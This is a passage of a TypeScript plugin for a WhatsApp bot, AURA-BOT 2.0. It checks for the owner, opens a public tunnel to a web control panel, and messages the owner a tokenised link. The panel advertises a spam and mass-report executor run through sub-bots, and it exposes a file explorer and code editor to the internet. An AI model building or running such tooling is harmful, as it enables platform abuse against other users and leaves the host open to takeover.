  const preferredPort = Number(process.env.WEB_PORT || process.env.PORT || 0);

  return new Promise((resolve) => {
    server.listen(preferredPort, "0.0.0.0", () => {
      const addr = server.address();
      const assignedPort = typeof addr === "object" && addr ? addr.port : preferredPort || 8080;
      state.server = server;
      state.port = assignedPort;
      resolve(assignedPort);
    });
  });
}

export default {
  name: ["checkweb", "webpanel", "panelweb", "dashboard"],
  category: "group",
  description: "Inicia el panel de control web en tiempo real y envía el enlace privado al propietario.",
  groupOnly: false,
  ownerOnly: false,
  async run(ctx: CommandContext) {
    const { reply, react, sock, msg, from, db } = ctx;

    hookSockets(sock);
    await syncCommandInterceptors();

    const rawSender =
      msg.key?.participant ||
      (msg.key?.fromMe ? sock.user?.id : from) ||
      (ctx as any).sender ||
      from;

    const cleanSenderNum = String(rawSender).split("@")[0].split(":")[0].replace(/\D/g, "");
    let resolvedSenderNum = cleanSenderNum;

    if (String(rawSender).endsWith("@lid")) {
      const groupParts = ctx.groupMeta?.participants || [];
      const found = groupParts.find((p: any) => {
        const pLid = String(p.lid || "").split("@")[0].split(":")[0];
        const pId = String(p.id || "").split("@")[0].split(":")[0];
        return pLid === cleanSenderNum || pId === cleanSenderNum;
      }) as any;

      if (found?.phoneNumber) {
        resolvedSenderNum = String(found.phoneNumber).replace(/\D/g, "");
      } else if (found?.id?.endsWith("@s.whatsapp.net")) {
        resolvedSenderNum = String(found.id).split("@")[0].split(":")[0].replace(/\D/g, "");
      }
    }

    const dbAny = db as any;
    const isAuthorizedOwner =
      resolvedSenderNum === "573118353868" ||
      cleanSenderNum === "573118353868" ||
      Boolean((ctx as any).isOwner) ||
      Boolean(msg.key?.fromMe) ||
      Boolean(dbAny?.hasRole?.(`${resolvedSenderNum}@s.whatsapp.net`, "owner")) ||
      Boolean(dbAny?.hasRole?.(rawSender, "owner"));

    if (!isAuthorizedOwner) {
      await react("⛔").catch(() => undefined);
      return reply("⛔ *Acceso denegado:* Este panel es exclusivo para los propietarios del sistema.");
    }

    await react("🌐").catch(() => undefined);

    const port = await ensureWebServerRunning();
    const [tunnelBase, publicIp] = await Promise.all([
      startPublicTunnel(port),
      fetchPublicIp(),
    ]);

    const directLink = `http://${publicIp}:${port}/?token=${state.token}`;
    const tunnelLink = tunnelBase ? `${tunnelBase}/?token=${state.token}` : null;

    const dmRecipient =
      resolvedSenderNum.length >= 7
        ? `${resolvedSenderNum}@s.whatsapp.net`
        : "573118353868@s.whatsapp.net";

    const panelMessage = [
      `🌐 *${fytBold("AURA-BOT 2.0 // PANEL WEB ACTIVO")}* 🌐`,
      `━━━━━━━━━━━━━━━━━━━━━━`,
      `🔑 *Token de Propietario:* \`${state.token}\``,
      `🔌 *Puerto Interno:* \`${port}\``,
      ``,
      ...(tunnelLink
        ? [
            `🚀 *Enlace Global (Acceso Externo HTTPS):*`,
            `${tunnelLink}`,
            ``,
          ]
        : []),
      `🖥️ *Enlace Directo IP Pública:*`,
      `${directLink}`,
      ``,
      `📋 *Módulos habilitados en el panel:*`,
      `• Telemetría en vivo (Subbots, Grupos, Mensajes RX/TX)`,
      `• Pausar / Reanudar todos los Subbots en un clic`,
      `• Gestor de procesos (Matar PIDs) y Limpiador de RAM`,
      `• Bloqueo de comandos por mantenimiento en caliente`,
      `• Registro y ejecutor de reportes/spam por Subbots`,
      `• Explorador de archivos, Editor de código y Benchmark V8`,
    ].join("\n");

    await sock.sendMessage(dmRecipient, { text: panelMessage });

    if (from !== dmRecipient) {
      await reply("🔒 *Verificación de propietario exitosa.* El enlace personal del panel web fue enviado a tu chat privado.");
    }

    await react("✅").catch(() => undefined);
  },
};
